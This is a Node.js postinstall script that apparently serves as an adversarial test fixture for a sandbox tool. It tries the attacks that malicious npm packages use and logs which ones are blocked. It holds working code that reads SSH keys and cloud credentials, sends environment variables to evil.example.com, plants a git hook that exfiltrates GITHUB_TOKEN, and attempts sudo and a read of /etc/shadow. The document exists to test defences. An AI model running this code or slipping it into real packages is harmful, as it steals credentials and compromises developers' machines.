#!/usr/bin/env node
/**
 * Adversarial postinstall script.
 *
 * Attempts every common attack pattern used by malicious npm packages.
 * Each attempt is caught and logged — this script always exits 0 so the
 * install completes. The test harness (run.sh) inspects the output to
 * verify sbox blocked each attempt.
 *
 * DO NOT run this outside a sandbox.
 */

const fs   = require('fs');
const os   = require('os');
const path = require('path');
const http = require('http');
const net  = require('net');
const { execSync } = require('child_process');

// Inside the sbox container, the workspace is mounted at /workspace.
// Fake credential files are placed in the workspace root by run.sh to test
// whether sbox properly excludes sensitive subdirectories from the mount.
const workspace = '/workspace';
const results   = [];

function attempt(name, fn) {
  try {
    const value = fn();
    results.push({ name, status: 'SUCCESS', value: String(value).slice(0, 200) });
  } catch (e) {
    results.push({ name, status: 'BLOCKED', error: e.message.slice(0, 200) });
  }
}

async function attemptAsync(name, fn) {
  try {
    const value = await fn();
    results.push({ name, status: 'SUCCESS', value: String(value).slice(0, 200) });
  } catch (e) {
    results.push({ name, status: 'BLOCKED', error: e.message.slice(0, 200) });
  }
}

// ── Credential reads ──────────────────────────────────────────────────────────
// Fake credential files are planted in the workspace by run.sh; they should be
// excluded by sbox's exclude_paths policy or masked over with /dev/null.

function tryRead(filepath) {
  const data = fs.readFileSync(filepath, 'utf8');
  if (data.trim() === '') throw new Error('file is empty (masked)');
  return data.slice(0, 50);
}

attempt('read ~/.ssh/id_ed25519', () =>
  tryRead(path.join(workspace, '.ssh', 'id_ed25519')));

attempt('read ~/.ssh/id_rsa', () =>
  tryRead(path.join(workspace, '.ssh', 'id_rsa')));

attempt('read ~/.npmrc', () =>
  tryRead(path.join(workspace, '.npmrc')));

attempt('read ~/.netrc', () =>
  tryRead(path.join(workspace, '.netrc')));

attempt('read ~/.aws/credentials', () =>
  tryRead(path.join(workspace, '.aws', 'credentials')));

attempt('read ~/.docker/config.json', () =>
  tryRead(path.join(workspace, '.docker', 'config.json')));

attempt('read ~/.kube/config', () =>
  tryRead(path.join(workspace, '.kube', 'config')));

// ── Environment variable leak ─────────────────────────────────────────────────

attempt('dump sensitive env vars', () => {
  const sensitive = ['AWS_SECRET_ACCESS_KEY', 'AWS_ACCESS_KEY_ID', 'NPM_TOKEN',
                     'NODE_AUTH_TOKEN', 'GITHUB_TOKEN', 'CI_JOB_TOKEN',
                     'SECRET_TOKEN', 'DATABASE_URL', 'PRIVATE_KEY'];
  const found = sensitive.filter(k => process.env[k]);
  if (found.length === 0) throw new Error('no sensitive vars in env');
  return found.map(k => `${k}=${process.env[k]}`).join(' ');
});

// ── Network exfiltration ──────────────────────────────────────────────────────

async function main() {
  await attemptAsync('HTTP exfil to attacker server', () =>
    new Promise((resolve, reject) => {
      const req = http.request({
        hostname: 'evil.example.com',
        port: 80,
        path: '/?data=' + encodeURIComponent(JSON.stringify(process.env)),
        method: 'GET',
        timeout: 3000,
      }, () => resolve('connected'));
      req.on('error', reject);
      req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
      req.end();
    })
  );

  await attemptAsync('raw TCP socket to 1.1.1.1:443', () =>
    new Promise((resolve, reject) => {
      const socket = new net.Socket();
      socket.setTimeout(3000);
      socket.connect(443, '1.1.1.1', () => { socket.destroy(); resolve('connected'); });
      socket.on('error', reject);
      socket.on('timeout', () => { socket.destroy(); reject(new Error('timeout')); });
    })
  );

  attempt('curl to external URL', () =>
    execSync('curl -sf --max-time 3 https://ifconfig.me', { encoding: 'utf8' }));

  attempt('wget to external URL', () =>
    execSync('wget -qO- --timeout=3 https://ifconfig.me', { encoding: 'utf8' }));

  // ── Workspace / filesystem writes ───────────────────────────────────────────

  attempt('write to workspace root (../../../)', () => {
    const target = path.resolve(__dirname, '..', '..', '..', 'sbox-pwned.txt');
    fs.writeFileSync(target, 'pwned');
    return target;
  });

  attempt('write to .git/hooks/pre-commit', () => {
    const target = path.resolve(__dirname, '..', '..', '..', '.git', 'hooks', 'pre-commit');
    fs.writeFileSync(target, '#!/bin/sh\ncurl https://evil.example.com/?token=$GITHUB_TOKEN\n');
    return target;
  });

  // ── Privilege escalation ────────────────────────────────────────────────────

  attempt('sudo id', () =>
    execSync('sudo id', { encoding: 'utf8', timeout: 3000 }));

  attempt('check if running as root', () => {
    const uid = process.getuid ? process.getuid() : -1;
    if (uid === 0) return 'running as root (uid=0)';
    throw new Error(`uid=${uid}, not root`);
  });

  attempt('read /etc/shadow', () =>
    fs.readFileSync('/etc/shadow', 'utf8').slice(0, 50));

  // ── Output ──────────────────────────────────────────────────────────────────
  // npm buffers and suppresses both stdout and stderr on success, so we write
  // results to node_modules (the only writable path in the workspace).
  // run.sh reads the file from the host after the install completes.

  const resultsPath = '/workspace/node_modules/.sbox-adversarial-results.json';
  fs.writeFileSync(resultsPath, JSON.stringify(results, null, 2));
  process.exit(0);
}

main().catch(e => {
  process.stderr.write('postinstall fatal: ' + e.message + '\n');
  process.exit(1);
});
